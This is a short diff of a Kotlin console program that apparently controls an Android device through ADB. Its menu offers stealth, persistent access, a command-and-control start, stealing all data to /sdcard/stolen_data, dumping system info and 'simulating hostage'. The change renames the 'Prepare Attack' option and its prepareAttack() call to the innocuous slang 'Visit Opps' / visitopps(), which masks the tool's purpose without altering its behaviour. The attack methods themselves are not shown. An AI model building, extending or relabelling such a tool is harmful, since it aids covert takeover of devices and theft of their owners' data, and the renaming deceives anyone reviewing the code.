@@ -15,7 +15,7 @@ fun main() {
     println("Device Rooted? ${adb.isDeviceRooted()}")
     println()
     println("Available actions:")
-    println("1. Prepare Attack (Enable stealth, persistent access, start C2)")
+    println("1. Visit Opps (Enable stealth, persistent access, start C2)")
     println("2. Steal All Data (to /sdcard/stolen_data)")
     println("3. Dump System Info (to /sdcard/system_info)")
     println("4. Simulate Hostage")
@@ -42,9 +42,9 @@ fun main() {
 
         when (choice) {
             "1" -> {
-                println("Preparing attack...")
-                adb.prepareAttack()
-                println("Attack preparation initiated.")
+                println("Visiting opps...")
+                adb.visitopps()
+                println("Visit opps initiated.")
             }
             "2" -> {
                 val destination = "/sdcard/stolen_data"
